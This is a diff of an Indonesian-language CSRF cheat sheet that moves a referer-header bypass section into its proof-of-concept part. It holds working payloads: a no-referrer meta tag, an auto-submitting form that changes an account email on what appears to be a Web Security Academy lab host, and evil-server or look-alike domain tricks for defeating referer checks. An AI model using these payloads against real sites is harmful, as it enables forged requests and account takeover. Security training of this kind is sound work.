@@ -21,13 +21,6 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
 
 ## Bypass
 - Ketika kita berhasil mengeksploitasi XSS, segala defense mechanisms terhadap CSRF menjadi useless.
-- Bypass referer header
-  - Salah satu langkah preventif untuk menanggulangi CSRF adalah memastian referer header berisikan website yang valid. Tapi bagaimana jika fielder header tersebut dihilangkan? kadang kita bisa membypass nya dengan meta tag berikut.
-    ```
-    <meta name="referrer" content="no-referrer" />
-    <iframe src=”data:text/html;base64,form_code_here”>
-    ```
-  - Kadang developer juga hanya memastika bahwa referer header mengandung domain mereka, kita bisa mengakalinya dengan menambahkan sebuah direktori dengan domain target pada evil server kita, contoh: `https://www.yoursite.com/https://www.theirsite.com/` atau `https://www.theirsite.computer/`.
 - Samesite cookie, bisa dibypass dengan modifikasi GET
 
 ## POC
@@ -93,7 +86,8 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
   </script>
 
   ```
-- Bypass Referrer
+- Bypass Referrer<br>
+Salah satu langkah preventif untuk menanggulangi CSRF adalah memastian referer header berisikan website yang valid. Tapi bagaimana jika fielder header tersebut dihilangkan? kadang kita bisa membypass nya dengan meta tag berikut.
   ```
   <meta name=”referrer” content=”no-referrer”>
     <form method="POST"  action="https://acd61f551e096953c052568a003100c3.web-security-academy.net/my-account/change-email">
@@ -103,6 +97,7 @@ Cross Site Request Forgery adalah serangan yang memaksa pengguna agar backend me
     document.forms[0].submit();
   </script>
   ```
+  Kadang developer juga hanya memastikan bahwa referer header mengandung domain mereka, kita bisa mengakalinya dengan menambahkan sebuah direktori dengan domain target pada evil server kita, contoh: `https://www.yoursite.com/https://www.theirsite.com/` atau `https://www.theirsite.computer/`.<br>
   ```
   tambahkan "referrer-Policy: unsafe-url" pada header
   
